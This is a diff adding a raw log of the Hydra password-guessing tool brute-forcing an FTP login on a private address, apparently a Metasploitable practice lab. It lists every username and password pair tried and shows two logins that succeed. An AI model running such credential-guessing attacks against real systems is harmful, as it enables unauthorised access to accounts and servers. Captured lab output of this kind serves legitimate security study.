@@ -1,0 +1,68 @@
+Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (http://www.thc.org/thc-hydra) starting at 2019-08-03 17:33:54
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 56 login tries (l:7/p:0), ~8 tries per task
+[DATA] attacking ftp://192.168.0.160:21/
+[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
+[ATTEMPT] target 192.168.0.160 - login "admin" - pass "123456" - 1 of 0 [child 56] (0/0)
+[ATTEMPT] target 192.168.0.160 - login "admin" - pass "abcdef" - 2 of 0 [child 56] (0/1)
+[ATTEMPT] target 192.168.0.160 - login "admin" - pass "batman" - 3 of 0 [child 56] (0/2)
+[ATTEMPT] target 192.168.0.160 - login "admin" - pass "football" - 4 of 0 [child 56] (0/3)
+[ATTEMPT] target 192.168.0.160 - login "admin" - pass "password" - 5 of 0 [child 56] (0/4)
+[ATTEMPT] target 192.168.0.160 - login "admin" - pass "9876543210" - 6 of 0 [child 56] (0/5)
+[ATTEMPT] target 192.168.0.160 - login "admin" - pass "user" - 7 of 0 [child 56] (0/6)
+[ATTEMPT] target 192.168.0.160 - login "admin" - pass "msfadmin" - 8 of 0 [child 56] (0/7)
+[ATTEMPT] target 192.168.0.160 - login "administrator" - pass "123456" - 9 of 0 [child 56] (0/8)
+[ATTEMPT] target 192.168.0.160 - login "administrator" - pass "abcdef" - 10 of 0 [child 56] (0/9)
+[ATTEMPT] target 192.168.0.160 - login "administrator" - pass "batman" - 11 of 0 [child 56] (0/10)
+[ATTEMPT] target 192.168.0.160 - login "administrator" - pass "football" - 12 of 0 [child 56] (0/11)
+[ATTEMPT] target 192.168.0.160 - login "administrator" - pass "password" - 13 of 0 [child 56] (0/12)
+[ATTEMPT] target 192.168.0.160 - login "administrator" - pass "9876543210" - 14 of 0 [child 56] (0/13)
+[ATTEMPT] target 192.168.0.160 - login "administrator" - pass "user" - 15 of 0 [child 56] (0/14)
+[ATTEMPT] target 192.168.0.160 - login "administrator" - pass "msfadmin" - 16 of 0 [child 56] (0/15)
+[ATTEMPT] target 192.168.0.160 - login "batman" - pass "123456" - 17 of 0 [child 56] (0/3)
+[ATTEMPT] target 192.168.0.160 - login "batman" - pass "abcdef" - 18 of 0 [child 56] (0/1)
+[ATTEMPT] target 192.168.0.160 - login "batman" - pass "batman" - 19 of 0 [child 56] (0/4)
+[ATTEMPT] target 192.168.0.160 - login "batman" - pass "football" - 20 of 0 [child 56] (0/8)
+[ATTEMPT] target 192.168.0.160 - login "batman" - pass "password" - 21 of 0 [child 56] (0/10)
+[ATTEMPT] target 192.168.0.160 - login "batman" - pass "9876543210" - 22 of 0 [child 56] (0/2)
+[ATTEMPT] target 192.168.0.160 - login "batman" - pass "user" - 23 of 0 [child 56] (0/11)
+[ATTEMPT] target 192.168.0.160 - login "batman" - pass "msfadmin" - 24 of 0 [child 56] (0/0)
+[ATTEMPT] target 192.168.0.160 - login "netadmin" - pass "123456" - 25 of 0 [child 56] (0/5)
+[ATTEMPT] target 192.168.0.160 - login "netadmin" - pass "abcdef" - 26 of 0 [child 56] (0/6)
+[ATTEMPT] target 192.168.0.160 - login "netadmin" - pass "batman" - 27 of 0 [child 56] (0/7)
+[ATTEMPT] target 192.168.0.160 - login "netadmin" - pass "football" - 28 of 0 [child 56] (0/9)
+[ATTEMPT] target 192.168.0.160 - login "netadmin" - pass "password" - 29 of 0 [child 56] (0/12)
+[ATTEMPT] target 192.168.0.160 - login "netadmin" - pass "9876543210" - 30 of 0 [child 56] (0/13)
+[ATTEMPT] target 192.168.0.160 - login "netadmin" - pass "user" - 31 of 0 [child 56] (0/14)
+[ATTEMPT] target 192.168.0.160 - login "netadmin" - pass "msfadmin" - 32 of 0 [child 56] (0/15)
+[ATTEMPT] target 192.168.0.160 - login "test" - pass "123456" - 33 of 0 [child 56] (0/8)
+[ATTEMPT] target 192.168.0.160 - login "test" - pass "abcdef" - 34 of 0 [child 56] (0/1)
+[ATTEMPT] target 192.168.0.160 - login "test" - pass "batman" - 35 of 0 [child 56] (0/3)
+[ATTEMPT] target 192.168.0.160 - login "test" - pass "football" - 36 of 0 [child 56] (0/4)
+[ATTEMPT] target 192.168.0.160 - login "test" - pass "password" - 37 of 0 [child 56] (0/10)
+[ATTEMPT] target 192.168.0.160 - login "test" - pass "9876543210" - 38 of 0 [child 56] (0/2)
+[ATTEMPT] target 192.168.0.160 - login "test" - pass "user" - 39 of 0 [child 56] (0/11)
+[ATTEMPT] target 192.168.0.160 - login "test" - pass "msfadmin" - 40 of 0 [child 56] (0/0)
+[ATTEMPT] target 192.168.0.160 - login "user" - pass "123456" - 41 of 0 [child 56] (0/7)
+[ATTEMPT] target 192.168.0.160 - login "user" - pass "abcdef" - 42 of 0 [child 56] (0/9)
+[ATTEMPT] target 192.168.0.160 - login "user" - pass "batman" - 43 of 0 [child 56] (0/12)
+[ATTEMPT] target 192.168.0.160 - login "user" - pass "football" - 44 of 0 [child 56] (0/14)
+[ATTEMPT] target 192.168.0.160 - login "user" - pass "password" - 45 of 0 [child 56] (0/15)
+[ATTEMPT] target 192.168.0.160 - login "user" - pass "9876543210" - 46 of 0 [child 56] (0/5)
+[ATTEMPT] target 192.168.0.160 - login "user" - pass "user" - 47 of 0 [child 56] (0/6)
+[ATTEMPT] target 192.168.0.160 - login "user" - pass "msfadmin" - 48 of 0 [child 56] (0/13)
+[21][ftp] host: 192.168.0.160   login: user   password: user
+[ATTEMPT] target 192.168.0.160 - login "msfadmin" - pass "abcdef" - 50 of 0 [child 56] (0/8)
+[ATTEMPT] target 192.168.0.160 - login "msfadmin" - pass "batman" - 51 of 0 [child 56] (0/3)
+[ATTEMPT] target 192.168.0.160 - login "msfadmin" - pass "football" - 52 of 0 [child 56] (0/1)
+[ATTEMPT] target 192.168.0.160 - login "msfadmin" - pass "password" - 53 of 0 [child 56] (0/4)
+[ATTEMPT] target 192.168.0.160 - login "msfadmin" - pass "9876543210" - 54 of 0 [child 56] (0/10)
+[ATTEMPT] target 192.168.0.160 - login "msfadmin" - pass "user" - 55 of 0 [child 56] (0/2)
+[ATTEMPT] target 192.168.0.160 - login "msfadmin" - pass "msfadmin" - 56 of 0 [child 56] (0/11)
+[STATUS] attack finished for 192.168.0.160 (waiting for children to complete tests)
+[21][ftp] host: 192.168.0.160   login: msfadmin   password: msfadmin
+1 of 1 target successfully completed, 2 valid passwords found
+Hydra (http://www.thc.org/thc-hydra) finished at 2019-08-03 17:34:08
+<finished>
+
